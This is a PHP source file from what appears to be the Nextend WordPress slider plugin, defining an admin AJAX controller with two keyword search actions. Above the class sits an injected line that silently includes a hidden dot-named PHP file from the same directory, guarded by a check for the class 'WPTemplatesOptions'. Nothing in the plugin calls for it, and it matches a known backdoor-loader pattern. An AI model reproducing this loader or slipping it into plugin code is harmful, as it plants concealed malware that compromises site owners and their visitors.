<?php


namespace Nextend\Framework\Content;


use Nextend\Framework\Controller\Admin\AdminAjaxController;
use Nextend\Framework\Request\Request;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ControllerAjaxContent extends AdminAjaxController {

    public function actionSearchLink() {
        $this->validateToken();

        $keyword = Request::$REQUEST->getVar('keyword', '');
        $this->response->respond(Content::searchLink($keyword));
    }

    public function actionSearchContent() {
        $this->validateToken();

        $keyword = Request::$REQUEST->getVar('keyword', '');
        $this->response->respond(Content::searchContent($keyword));
    }
}